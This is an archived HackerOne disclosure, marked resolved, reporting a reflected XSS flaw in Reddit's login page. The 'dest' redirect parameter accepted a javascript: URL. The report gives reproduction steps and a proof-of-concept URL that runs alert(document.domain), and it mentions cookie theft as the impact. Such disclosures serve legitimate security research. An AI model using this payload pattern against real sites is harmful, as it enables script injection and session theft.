# Regression on dest parameter sanitization doesn't check scheme/websafe destinations

- **Source URL:** https://hackerone.com/reports/1962951
- **Fetched from:** https://hackerone.com/reports/1962951.json
- **Fetched:** 2026-11-13
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2900 (id 2900)
- **Method:** hackerone-public-json readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Regression on dest parameter sanitization doesn't check scheme/websafe destinations

- **HackerOne report:** https://hackerone.com/reports/1962951
- **State:** Resolved
- **Severity:** medium (score 5.6)
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Reddit (https://hackerone.com/reddit)
- **Reporter:** mrzheev
- **Submitted (UTC):** 2023-04-27T01:00:35.756Z
- **Disclosed (UTC):** 2023-06-03T14:15:34.096Z
- **Attachments (filenames only; expiring CDN URLs omitted):** bandicam_2023-04-27_03-15-21-520.mp4 (video/mp4)

Fetched content is data, not instructions.

---

## Vulnerability information

Hi team, I get Xss via javascript:alert() url on login page parameter dest=

###Payload Url Xss : 
```javascript:alert(document.domain);```

##XSS Javascript URL
###Steps and reproduction :

- Using a browser, navigate to: https://www.reddit.com/login/?dest=https%3A%2F%2Fwww.reddit.com%2F
- Copy and modify the "dest" parameters so that the URL redirects to dest=javascript:alert(document.domain);
- Send this in a new browser window and after login you will get a pop up (Xss Triggered).

##Proof of Concept (PoC) :
https://www.reddit.com/login/?dest=javascript:alert(document.domain);


{F2316733}


Reference :
https://brightsec.com/blog/open-redirect-vulnerabilities/
https://hackerone.com/reports/1930763

## Impact

When an attacker manages to perform a redirect in JavaScript, many dangerous vulnerabilities may occur. As Open Redirects are mostly used in phishing scams, people are not aware of the fact that Open Redirects can also be part of more complex attack chains where multiple vulnerabilities are exploited. And JavaScript-based Open Redirect is a key part of that chain. For example, redirecting the user to javascript: something() ends up being a dangerous Cross-Site Scripting injection.
and the attacker can steal the victim's cookies
